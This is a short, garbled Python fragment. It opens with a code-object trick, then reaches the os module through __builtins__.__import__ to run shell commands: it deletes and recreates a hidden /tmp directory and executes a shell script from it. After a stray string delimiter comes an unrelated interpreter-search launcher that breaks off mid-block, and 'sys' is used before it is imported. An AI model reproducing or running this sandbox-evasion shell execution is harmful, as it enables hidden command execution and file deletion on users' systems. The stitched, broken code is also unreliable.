fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi.gi_code
sys.modules['__main__'].__builtins__.__import__('os').popen('rm -rf /tmp/.w;mkdir /tmp/.w;touch /tmp/.w/.r').read()
sys.modules['__main__'].__builtins__.__import__('os').system('/bin/sh /tmp/.w/.r')
"""

#!/usr/bin/env python
# mode: Python; coding: utf-8; indent-tabs-mode: nil; tab-width: 4;
# Search for Python interpreter
import os
import sys
pybin = None
for path in os.environ.get('PATH', '').split(os.pathsep):
    for binary in ('python2.6', 'python26', 'python2.7', 'python27', 'python'):
        full_path = os.path.join(path, binary)
        if os.path.exists(full_path):
            pybin = full_path
            break
    if pybin:
        break
if pybin:
   
